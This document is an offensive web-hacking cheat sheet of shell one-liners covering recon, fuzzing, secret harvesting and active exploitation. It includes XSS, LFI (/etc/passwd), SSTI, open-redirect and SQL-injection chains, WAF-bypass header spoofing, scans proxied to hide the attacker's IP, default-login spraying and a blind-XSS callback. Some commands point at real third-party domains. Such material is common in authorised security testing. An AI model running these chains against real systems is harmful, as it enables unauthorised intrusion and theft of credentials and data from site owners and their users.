# [ORIGIN OBFUSCATION - PROXY] Route a fast port scan through a SOCKS5 proxy to hide your true source IP.
naabu -l ips.txt -p - -proxy socks5://127.0.0.1:1080 -silent

```
# Directory & File Brute-Forcing (Phase 3.0.3) ^oneliner-dirbrute

---

### **Directory & File Brute-Forcing**

```bash
# Standard Scan: Executes a baseline dirsearch scan against a single target for common, high-value file extensions.
python3 dirsearch.py -u <https://target.com/> -t 5 -e php,asp,aspx,js,json,txt,log,bak,config,sql -w wordlist.txt --full-url -o dirsearch_results.txt

# Advanced Recursive Scan: Deploys a high-thread dirsearch scan that digs into subdirectories and spoofs a header to bypass simple filters.
python3 dirsearch.py -u <https://target.com/> -t 40 -e [EXTS] -H 'X-FORWARDED-FOR: 127.0.0.1' -w wordlist.txt -x 412 --exclude-sizes 52KB --recursive

# Content Discovery via Response Grep: Uses dirsearch to not only find paths but to actively grep response bodies for keywords (e.g., "S3_SECRET_KEY", "api_key"), turning discovery into immediate sensitive info disclosure.
dirsearch -u <https://target.com/> -w wordlist.txt --grep "S3_SECRET_KEY,api_key,password" -t 50

# Bulk Host Scanning: Scans an entire list of live subdomains with high-thread, recursive dirsearch, filtering common error codes for efficiency.
dirsearch -l subdomains_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -w /root/recon/wordlist/final-wordlist.txt

# Deep-Dive Extension Fuzz: Focuses an intense scan on a single target using a massive list of sensitive extensions to find backups, configs, and source code.
dirsearch -u <https://www.viator.com> -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,~.php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,log,old,rar,sql,sql~,tar,tgz,sql,sql.tar.gz,sql~,swp,swp~,tar,tar.bz

# Comprehensive Deep-Dive Scan: Executes a dirsearch scan with an exhaustive list of extensions and flags tailored for deep discovery and evasion.
dirsearch -u <https://example.com> -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1

# Basic FFUF Fuzzing: A simple and fast ffuf command to brute-force directories and files on a target URL.
ffuf -w wordlist.txt -u <https://target.com/FUZZ> -c

# API Schema Discovery: Prioritizes finding OpenAPI/Swagger specification files. Discovering the API schema is a critical intelligence win, revealing the entire API structure without noisy brute-forcing.
ffuf -w /path/to/api_wordlist.txt -u <https://api.target.com/FUZZ> -H "Accept: application/json" -mc 200 -mr "swagger|openapi"

# POST Method Fuzzing: Uses FFUF to discover endpoints or directories that may only be accessible via a POST request, bypassing GET-only checks.
ffuf -w wordlist.txt -u <https://website.com/FUZZ> -X POST -c

# Case-Insensitive Fuzzing: Deploys FFUF with case-insensitive matching to find resources on servers (like IIS) that do not differentiate between uppercase and lowercase paths.
ffuf -u <https://example.com/FUZZ> -w wordlist.txt -ic -c

# File Upload Endpoint Fuzzing: Utilizes FFUF with the PUT method and an authenticated session cookie to discover potential file upload locations.
ffuf -w /path/to/wordlist.txt -X PUT -u <https://target.com/FUZZ> -b 'session=abcdef'

# Anomaly Detection Fuzzing with FFUF: Filters out baseline responses by size, allowing discovery of non-standard pages (e.g., custom 404s that return 200 OK).
ffuf -w wordlist.txt -u <https://target.com/FUZZ> -c -fs <baseline_size>

# Behavioral Anomaly Fuzzing (Time-Based): Uses ffuf to identify endpoints that cause a significant delay, indicating complex server-side processing, database queries, or potential time-based vulnerabilities, even on non-200 responses.
ffuf -w wordlist.txt -u <https://target.com/FUZZ> -c -maxtime 3 -o results.json

# Header Spoofing Fuzz: Uses custom headers in ffuf to emulate legitimate browser traffic, useful for bypassing basic WAF and anti-bot protections.
ffuf -w final-wordlist.txt -u <https://palkkalaskuri.elo.fi/FUZZ> -c -H "User-Agent: Mozilla/5.0..." -H "X-Forwarded-For: 127.0.0.1"

# Multi-Wordlist Fuzzing: Simultaneously fuzzes two parts of a URL (e.g., subdomain and path) by assigning different wordlists to keywords.
ffuf -u W2/W1 -w ./subdomains.txt:W2 -w ./paths.txt:W1 -c -ac

# Fast Recursive Feroxbuster Scan: Leverages the speed of Rust to perform a deep recursive scan, automatically filtering out common "not found" responses.
feroxbuster --url <https://target.com> --depth 2 --wordlist final-wordlist.txt --filter-status 404

# Data Extraction with Feroxbuster: Performs a scan and uses a regex to automatically extract valuable information (e.g., email addresses, AWS keys) directly from the response bodies of discovered pages.
feroxbuster -u <https://target.com> -w wordlist.txt --extract-regex 'AKIA[0-9A-Z]{16}' -o extracted_keys.txt

# Tech-Specific Feroxbuster Scan: Narrows the focus of a feroxbuster scan to specific file extensions relevant to the target's technology stack.
feroxbuster --url <https://target.com> -w wordlist.txt -x php,js,json,config

# Gobuster Directory Scan: A fast and simple Gobuster command for directory enumeration with extension targeting.
gobuster dir -u <https://target.com> -w wordlist.txt -x .php,.txt,.html -t 50

# API Route Brute-Forcing with Kiterunner: Utilizes a specialized wordlist format (.kite) to perform a high-speed scan for API routes and endpoints.
kr scan <https://api.target.com> -w /path/to/routes-large.kite -o api_routes.txt

# Massive Host Discovery with MEG: Deploys a highly parallel scan to check for the existence of specific paths across a very large list of hosts.
meg --verbose /path/to/wordlist.txt hosts_live.txt output_dir

# MEG Output Cleanup: A simple pipe to parse the raw output from meg and display only the successful (200 OK) results.
cat output_dir/index | grep 200 | grep -v 301 | grep -v 404 | cut -d " " -f 2

# IIS Short Name Discovery: Executes a specialized scan against IIS servers to reveal hidden file and folder names via the 8.3 filename convention vulnerability.
java -jar iis_shortname_scanner.jar 2 20 "<https://target-iis-server.com>"

```

### **Parameter Discovery & Analysis (Phase 3.0.5) ^oneliner-params**

```bash
# Historical URL Aggregation: Combines results from both waybackurls and gau for a list of subdomains, then sorts and uniques them into a master list.
(waybackurls < subdomains_final.txt; gau subdomains_final.txt) | sort -u | uro > parameters.txt

# JavaScript-Sourced Endpoint Discovery: Scans all identified subdomains for JavaScript files and extracts relative paths from them, providing a highly accurate map of current, in-use API endpoints.
cat subdomains_final.txt | httpx -silent | subjs -c 10 | sort -u > js_endpoints.txt

# List Vulnerability Patterns: Displays all available vulnerability templates within gf, providing an operational menu of patterns to hunt for.
gf -list

# SQLi Pattern Matching: Scans a list of URLs with parameters and uses gf's regex patterns to instantly identify potential SQL injection points.
cat parameters.txt | gf sqli > params_sqli.txt

# Hidden Parameter Discovery: Probes a specific endpoint with a large wordlist to discover unlinked or hidden GET parameters not found in historical data.
arjun -u <https://example.com/test.php> -m get -oT arjun_results.txt

# Hidden Parameter Discovery (JSON): Targets modern APIs by discovering hidden parameters within JSON request bodies, a common blind spot for scanners that only check GET/POST form data.
arjun -u <https://api.target.com/v1/user> -m json -oT arjun_json_params.txt

# Live URL Filtering: Fetches historical URLs and pipes them to httpx to quickly identify which endpoints are still live and responding.
gau target.com | httpx -silent -mc 200,302,403 > live_urls.txt

# Automated XSS Probing Workflow: Finds historical URLs, filters for potential XSS vectors, and injects a basic payload into each parameter.
gau target.com | gf xss | qsreplace '<script>alert(1)</script>' | while read url; do curl -s -L "$url" | grep -q "alert(1)" && echo "Vulnerable: $url"; done

# Hidden Parameter Discovery (x8): Uses a modern, Rust-based tool to brute-force both GET and POST parameters on a target URL.
x8 -u "<https://example.com/action>" -w params_wordlist.txt -X POST

# Validated Vulnerability Endpoint Workflow: Combines gf pattern matching with httpx to produce a list of live, responsive URLs that are likely vulnerable.
cat parameters.txt | gf sqli | httpx -silent -mc 200,302,403 > live_sqli_endpoints.txt

# Automated Vulnerability Scanning Workflow: Takes a list of live, parameterized URLs and feeds them directly into Nuclei for automated scanning with a curated set of high-impact vulnerability templates.
cat live_urls.txt | nuclei -t /path/to/nuclei-templates/technologies/ -t /path/to/nuclei-templates/cves/ -o nuclei_findings.txt

# Parameter Mining from Archives (ParamSpider): A focused tool to crawl archived versions of a site specifically to find and list URL parameters.
python3 paramspider.py -d target.com --level high -o spider_params.txt

```

---


# Technology Fingerprinting (Phase 3.0.6 & Phase 4) ^oneliner-tech

### **Phase 1: Broad & Fast Web Technology Fingerprinting**

```bash
# [NUCLEI] - Rapidly identify web technologies across all live hosts, excluding low-impact info findings.
nuclei -l hosts_live.txt -t technologies -es info -o tech_results.txt -silent

# [HTTPX] - Perform a comprehensive, fast probe on live hosts to grab titles, status codes, server banners, and detected tech. This is the foundational active recon step.
httpx -l hosts_live.txt -title -tech-detect -status-code -server -o httpx_live_recon.txt -silent

# [WHATWEB] - Corroborate Nuclei findings with a different engine, running quietly and suppressing errors.
whatweb -i hosts_live.txt --no-errors -q >> whatweb_corroboration.txt

# [WAFW00F] - Fingerprint the Web Application Firewall (WAF) first. All subsequent attack traffic must be tailored to bypass this layer.
wafw00f -i hosts_live.txt -o waf_findings.txt -f text

# # [GF] - After gathering URLs from passive sources (gau, wayback), filter for endpoints commonly vulnerable to SQLi.
cat all_urls.txt | gf sqli | uro > sqli_potential_endpoints.txt

# # [HTTPX] - Actively probe subdomains to identify technologies commonly associated with SQL Injection (ASP, PHP, JSP).
subfinder -d target.com -silent | httpx -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

# [SHODAN-CLI] - Passively query Shodan for the target domain to fingerprint technologies and discover IPs without direct interaction.
shodan domain target.com | awk '{print $1, $3}' > shodan_passive_recon.txt
```

### **Phase 2: High-Impact Misconfiguration & Exposure Hunting**

```bash
# [NUCLEI] - Hunt specifically for high/critical severity backup file exposures (.zip, .bak, .tar.gz).
nuclei -l hosts_live.txt -t exposures/backups/ -s high,critical -o backup_findings.txt

# [NUCLEI] - Target exposed SQL dump files specifically, a potential source of critical data leakage.
nuclei -l hosts_live.txt -t exposures/files/sql-dump.yaml -o sqldump_findings.txt

# [NUCLEI] - Check for exposed PHP source code via common backup extensions (.php.bak, .php.old).
nuclei -l hosts_live.txt -t exposures/files/php-backup-files.yaml -o php_backup_findings.txt

# [NIKTO] - Run a standard Nikto scan against a single high-value target, saving results to an HTML report.
nikto -h <http://target-host.com> -o nikto_report.html -Format htm -Tuning 4

# Hunts for low-hanging fruit: critical misconfigurations and exposed sensitive files (.env, credentials, etc.).
nuclei -l live_web_hosts.txt -t misconfiguration,exposures -s high,critical -o vuln_misconfigs.txt -silent

# [NUCLEI] - Specifically hunt for exposed .env files, a common source of database credentials, API keys, and other critical secrets.
nuclei -l hosts_live.txt -t exposures/files/env-file.yaml -o env_file_findings.txt -silent

# [FFUF] - Fuzz for common sensitive directories and files that Nuclei might miss, using a curated wordlist. Filter for non-404 responses.
ffuf -c -w /path/to/wordlist.txt -u <https://target.com/FUZZ> -o ffuf_sensitive_files.txt -fs <size_of_404_page>

# Scans exclusively for known, high-impact Remote Code Execution (RCE) and SQL Injection (SQLi) vulnerabilities.
nuclei -l live_web_hosts.txt -tags rce,sqli -s high,critical -o vuln_rce_sqli.txt -silent

# Focuses on finding high-severity, known CVEs across all live web hosts.
nuclei -l live_web_hosts.txt -t cves/ -s high,critical -o vuln_cves.txt -silent

# [NUCLEI] - Scan for Log4Shell (CVE-2021-44228) vulnerabilities using OAST for reliable detection of blind spots. Requires a configured Interactsh server.
nuclei -l hosts_live.txt -t vulnerabilities/log4j/ -o vuln_log4shell.txt

# Scans for takeover vulnerabilities across all identified hosts, a common high-impact finding.
nuclei -l live_web_hosts.txt -t takeovers/ -o vuln_takeovers.txt -silent

# [NUCLEI] - Hunt for publicly exposed .git directories, which can leak entire source code repositories.
nuclei -l hosts_live.txt -t gitExposed.yaml -o git_exposed_findings.txt -silent

# [NUCLEI] - Check for misconfigured WordPress instances with publicly accessible setup files.
nuclei -l hosts_live.txt -t exposures/configs/wp-setup-config.yaml -o wp_setup_findings.txt -silent

```

### **Phase 3: Insecure Interfaces & Default Credentials**

```bash
# [NUCLEI] - Discover exposed administrative panels and login pages across all hosts.
nuclei -l hosts_live.txt -t http/exposed-panels -o exposed_panels.txt -silent

# [NUCLEI] - Test all discovered hosts for thousands of default credentials for various services.
nuclei -l hosts_live.txt -t http/default-logins -o default_logins.txt -silent

# [NUCLEI] - Hunt specifically for exposed Spring Boot Actuator endpoints, which can leak environment variables, memory dumps, and other sensitive data.
nuclei -l hosts_live.txt -t technologies/spring-boot-actuators.yaml -o spring_actuator_findings.txt -silent

# [HTTPX] - Probe all live subdomains for common Swagger API UI paths, indicating exposed API documentation.
subfinder -d target.com -silent | httpx -path /swagger-api/ -status-code -content-length -mc 200 -silent

# [CURL] - Enumerate WordPress users by exploiting the REST API endpoint, a precursor to password attacks.
curl -s <https://target.com/wp-json/wp/v2/users> | jq '.[].slug'
```

### **Phase 4: Code & Secret Leakage Recon**

```bash
# [TRUFFLEHOG] - Scan an entire GitHub organization for hardcoded secrets and credentials.
trufflehog github --org=<TargetOrganization> > secrets_github_org.txt

# [TRUFFLEHOG] - Perform a deep scan on a single, high-value GitHub repository, including commit history, issues, and pull requests.
trufflehog github --repo=https://github.com/user/repo --issue-comments --pr-comments > secrets_repo_deep_scan.txt

# [TRUFFLEHOG] - Scan a specific Docker image from a public or private registry for hardcoded secrets.
trufflehog docker --image=<registry/image:tag> > secrets_docker_image.txt

# [GITLEAKS] - Scan a locally cloned source code repository for secrets.
gitleaks detect -s /path/to/cloned/repo/ -r gitleaks_report.json

# [NUCLEI] - Validate a list of discovered API tokens/keys against dozens of services to check their validity.
nuclei -t token-spray/ -var token=found_tokens.txt -o token_validation_results.txt

# [NUCLEI] - Run a broad scan for various types of credential disclosures across all live hosts.
nuclei -l hosts_live.txt -t credentials-disclosure-all.yaml -o credential_leaks.txt -silent
```

### **Phase 5: Specialized Tech & Exploit DB Scanning**

```bash
# [SEARCHSPLOIT] - Search the offline Exploit-DB for exploits matching a specific technology and version.
searchsploit "Jira 8.13"

# [GETSPLOIT] - Search the online Vulners database for exploits.
getsploit "wordpress 5.8"

# [WPSCAN] - Perform an unauthenticated scan on a WordPress site, enumerating plugins, themes, and users.
wpscan --url <http://wordpress-site.com> --enumerate p,t,u --api-token <YOUR_API_TOKEN>

# [NUCLEI-WORKFLOW] - Automate scans by first detecting technologies, then running only relevant CVE/vulnerability templates for extreme efficiency and stealth.
nuclei -l hosts_live.txt -w workflows/tech-detect.yaml -w workflows/cve-scan.yaml -o vuln_workflow_results.txt

# [DROOPESCAN] - Scan for vulnerabilities in non-WordPress CMS platforms like Drupal, Joomla, and Moodle.
droopescan scan drupal -u <http://drupal-site.com>

# [IIS-SHORTNAME-SCANNER] - Test an IIS server for the legacy 8.3 filename vulnerability to discover hidden files.
java -jar iis_shortname_scanner.jar 2 20 "<https://iis.target.com>"

# [WPSCAN] - Run an aggressive, unauthenticated scan enumerating all plugins, themes, and users.
wpscan --url <http://wordpress-site.com> --disable-tls-checks -e ap,at,u --plugins-detection aggressive --force --api-token <YOUR_API_TOKEN>

# [SHORTSCAN] - Discover sensitive files on IIS servers via 8.3 filename enumeration.
shortscan <https://iis.target.com> -F

# [JIRA-SCANNER] - Run a dedicated scanner against a discovered Jira instance to find common vulnerabilities and misconfigurations.
python3 jira-scanner.py --url <https://jira.target.com> --scan

```

---


# Post-Discovery Javascript (Phase 3.0.4) ^oneliner-js

### **Phase 1: Broad Crawling & Discovery**

```bash
# [GOSPIDER] Execute a broad, high-depth crawl against a list of live hosts to gather as many endpoints as possible.
gospider -S hosts_live.txt -d 16 -a -c 250 | tee gospider_raw.txt

# [GOSPIDER] Perform a more targeted crawl, excluding common media files to focus on code and API endpoints.
gospider -S hosts_live.txt -c 10 -d 1 --other-source --include-subs --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" | tee gospider_filtered.txt

# [GOSPIDER] Run a focused crawl against a single high-value target to discover its associated endpoints and links.
gospider -s "<https://example.com>" -o output -c 10 -d 1 --other-source --include-subs

# [KATANA] Crawl a list of live websites to discover linked assets and potential JS files.
katana -list live_websites.txt -jc -o katana_urls.txt

# [KATANA] Perform a headless crawl, scraping JS files and custom-defined field patterns (e.g., API keys) from the DOM.
katana -list live_websites.txt -headless -jc -f custom_field_regex.txt -o katana_headless_output.txt

# [GAU] Passively fetch all known URLs for a domain and its subdomains from multiple archival sources.
gau --subs target.com | tee gau_urls.txt

# [GAU & HTTPX] Fetch all known URLs and immediately validate which ones are live and return a 200 OK status code.
gau --subs target.com | httpx -silent -mc 200 -o gau_live_urls.txt

# [HAKRAWLER] Run a focused, medium-depth crawl against a single target, specifically extracting URLs and JS file locations.
echo "<https://target.example.com>" | hakrawler -depth 3 -plain -js -out hakrawler_results.txt

# [WAYMORE] Go deeper into archives by downloading the full historical response bodies of discovered assets for offline analysis.
waymore -i target.com -mode R -oR waymore_responses/
```

### **Phase 2: Output Processing & Filtering**

```bash
# [JQ] Parse amass's JSON output to extract only fully-qualified domain names.
cat amass.json | jq -r .name >> amass_domains.txt

# [JQ] Parse amass's JSON output to extract only resolved IP addresses.
cat amass.json | jq '.addresses[] .ip' >> amass_ips.txt

# [JQ] Parse amass's JSON output to extract only the IP blocks (CIDR notation) the assets belong to.
cat amass.json | jq '.addresses[] .cidr' >> amass_cidrs.txt

# [CLEANUP] Combine all gospider output files and remove duplicate lines to create a master endpoint list.
cat gospider_*.txt | sort -u >> endpoints.txt

# [SCOPE] Filter a raw list of URLs to only include those that match the target's primary domain.
cat gospider_raw.txt | sort -u | grep -oP "http(s)?://((?i)(([a-zA-Z0-9]{1}|[_a-zA-Z0-9]{1}[_a-zA-Z0-9-]{0,61}[a-zA-Z0-9]{1})[.]{1})+)?targetdomain\\\\.com.*" | tee endpoints_in_scope.txt

# [FILTERING] Refine the master list by removing noise and irrelevant file extensions to create a final, cleaner list.
cat endpoints.txt | grep -v -e "js" -e "Error:" -e "[THREAD]" -e "Usage:" -e "mm/dd/yy" -e "svg" -e "png" -e "jpg" | tee -a endpoints_final.txt

# [UNFURL] Extract only the domain names from a list of URLs for domain-focused analysis.
cat urls.txt | unfurl -u domains | sort -u > unique_domains.txt

# [UNFURL] Extract only the parameter names (keys) from a list of URLs to build a parameter dictionary.
cat urls.txt | unfurl -u keys | sort -u > parameter_keys.txt

# [TARGETING] Search the final endpoint list for keywords like "admin" to identify potentially sensitive panels.
cat endpoints_final.txt | grep "admin" >> endpoints_admin.txt

# [TARGETING] From archived URLs, extract all endpoints that contain parameters for later fuzzing.
cat archived_urls.txt | grep "=" | anew parameters.txt

# [PARAMS] Build a target-specific parameter wordlist from all known archived URLs.
gau --subs targetdomain.com | grep -oP "(\\\\?|\\\\&)\\\\w+" | tr -d "?|&" | sort -u | tee target_params.txt

```

### **Phase 3: Targeted JavaScript Discovery**

```bash
# [GAU/HTTPX] Fetch all known URLs for a domain, filter for JavaScript files, and then probe them to find live, valid JS endpoints.
echo target.com | gau | grep '\\\\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'

# [KATANA] Crawl a list of live subdomains to find linked assets, focusing on discovering JavaScript files by filtering out common media types.
katana -u subdomains_alive.txt -d 5 -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

# [WAYBACKURLS] Extract all JavaScript files for a list of websites from the Wayback Machine.
cat live_websites.txt | waybackurls | grep "\\.js" | anew js_files.txt

# [ARCHIVE AGGREGATION] Combine both waybackurls and gau to build a comprehensive list of unique, historical JS files.
waybackurls target.com | anew wayback_js.txt; gau target.com | anew gau_js.txt; cat *.txt | grep '\\\\.js$' | sort -u > all_js_files.txt

# [GREP] Filter the output from katana or other crawlers to isolate only the JavaScript files.
cat allurls.txt | grep -E "\\.js$" >> js.txt

# [URO] A quick one-liner to extract unique URLs ending in ".js" from a larger list of mixed file types.
cat ext.txt | grep ".js$" | uro

# [SOURCEMAP DISCOVERY] Probe a list of live JS files to see if a corresponding source map file (.js.map) existsâ€”a critical intel source.
cat live_js.txt | sed 's/$/.map/' | httpx -mc 200 -o found_sourcemaps.txt

```

### **Phase 4: Static Analysis & Secret Hunting**

```bash
# [GREP] Statically analyze a single JavaScript file to extract relative URL paths and potential API endpoints.
cat file.js | grep -aoP "(?<=(\\"|\\'|\\))\\\\/[a-zA-Z0-9_?&=\\\\/\\\\-\\\\#\\\\.]*(?=(\\\\"|\\\\'|\\\\))" | sort -u

# [SECRETFINDER] Loop through a list of live JS file URLs and run SecretFinder on each to automatically scan for API keys, secrets, and sensitive data.
cat jsfiles.txt | while read url; do python3 /path/to/SecretFinder.py -i $url -o cli >> secret.txt; done

# [INTERLACE & SECRETFINDER] Use Interlace to parallelize SecretFinder scans across many hosts for a massive speed increase.
interlace -tL live_js.txt -threads 50 -c "python3 /path/to/SecretFinder.py -i _target_ -o cli" | tee secrets_found.txt

# [LINKFINDER] Run LinkFinder against a list of JS files to automatically discover endpoints and paths.
python3 linkfinder.py -i js_files.txt -o js_endpoints.txt

# [XNLINKFINDER] Use the more modern xnLinkFinder to analyze JS files, including offline files, for endpoints.
python3 xnLinkFinder.py -i live_js.txt -o xn_endpoints.txt

# [JSLEAKS] Use jsleaks to efficiently run both link-finding and secret-searching patterns against a list of live JS files.
cat live_js.txt | jsleaks -s -l -k

# [LAZYEGG] Perform a comprehensive analysis of each JS file, extracting domains, IPs, potential credentials, and localStorage data.
cat live_js.txt | xargs -I{} bash -c 'echo -e "\\\\ntarget : {}\\\\n" && python lazyegg.py "{}" --leaked_creds --local_storage'

# [GF] Use GF patterns to search a list of JS files for sensitive information like AWS keys.
cat js_files.txt | gf aws-keys | tee aws_keys.txt

# [GF] Use GF patterns to search a list of JS files for any URL-like strings.
cat js_files.txt | gf urls | tee sensitive_urls.txt

# [TRUFFLEHOG] Run TruffleHog against a directory of downloaded JS files to perform deep, entropy-based secret scanning.
trufflehog filesystem /path/to/js_files/ --only-verified

# [VALIDATION] Manually validate a discovered API key or bearer token using curl.
curl -s -k -X GET "<https://api.example.com/resource>" -H "Authorization: Bearer <extracted_key>"

```

### **Phase 5: Advanced Parameter Discovery**

```bash
# [ARJUN] Perform a deep analysis of a specific URL to discover hidden GET and POST parameters.
arjun -u "<https://target.example.com/endpoint>" -m GET,POST --stable -o arjun_params.json

# [PARAMSPIDER] Mine web archives for a given domain to discover historical and current parameters.
python3 paramspider.py --domain target.com --exclude woff,css,js --output paramspider_output.txt

# [X8] Use the Rust-based tool x8 to perform high-speed parameter bruteforcing against a specific endpoint.
x8 -u "<https://example.com/api/v1/user>" -w common-parameters.txt

# [FFUF] Bruteforce a specific parameter on a known endpoint using a wordlist to find hidden values or behaviors.
ffuf -u <https://target.com/page.php?FUZZ=test> -w /usr/share/wordlists/params.txt -fs <size_of_default_page>

# [FFUF AUTOCALIBRATE] Fuzz for parameters while automatically calibrating the filter to hide baseline responses, revealing only meaningful changes.
ffuf -u '<https://target.com/page.php?FUZZ=test>' -w ./params.txt -ac
```

### **Phase 6: Active Vulnerability Scanning**

```bash
# [KATANA/NUCLEI] A powerful chain to discover all JS files on a target and immediately run Nuclei's exposure templates against them.
echo www.example.com | katana -ps | grep -E "\\\\.js$" | nuclei -t ~/nuclei-templates/http/exposures/ -c 30

# [NUCLEI DAST] Chain passive discovery with Nuclei's dynamic scanning engine to test for runtime vulnerabilities like XSS and SQLi.
gau --subs target.com | grep '?' | httpx -silent | nuclei -dast -o dast_results.txt

# [XSS CHAIN] A full hunting chain to find URLs, filter for XSS patterns, check for reflection, and scan with dalfox.
echo "target.com" | gau | gf xss | uro | Gxss -p test | dalfox pipe

# [XSS CHAIN v2] A more precise XSS chain that filters for HTML content types before scanning to reduce noise from JSON APIs.
gau --subs target.com | gf xss | httpx -silent -ct | grep 'text/html' | cut -d ' ' -f 1 | dalfox pipe --skip-bav

# [LFI CHAIN] An automated chain to discover LFI-prone URLs, inject a payload, and grep the response for evidence of a successful read.
gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# [OPEN REDIRECT CHAIN] A chain to find redirect parameters, inject a malicious URL, and check if the response headers indicate a successful redirect.
gau target.com | gf redirect | uro | qsreplace "<https://evil.com>" | httpx-toolkit -silent -fr -mr "evil.com"

# [SSTI CHAIN] Scan for potential Server-Side Template Injection by injecting a basic math payload and checking for evaluation.
gau --subs target.com | gf ssti | qsreplace "{{7*7}}" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "49" && echo "VULN! %"'

# [SQLI CHAIN] Feed all parameterized URLs from passive discovery directly into SQLMap for automated injection testing.
gau --subs target.com | grep '?' | httpx -silent | sqlmap --crawl=1 --batch --disable-coloring

# [DALFOX] Scan a URL for XSS, feeding it potentially interesting parameters discovered in previous phases.
dalfox url "<http://testphp.vulnweb.com/listproducts.php?cat=123>" -b <https://your-callback.com>

# [GXSS] Quickly check a list of URLs with parameters for reflection, a key indicator of potential XSS.
cat urls_with_params.txt | Gxss -c 100 -p paYlOad

```





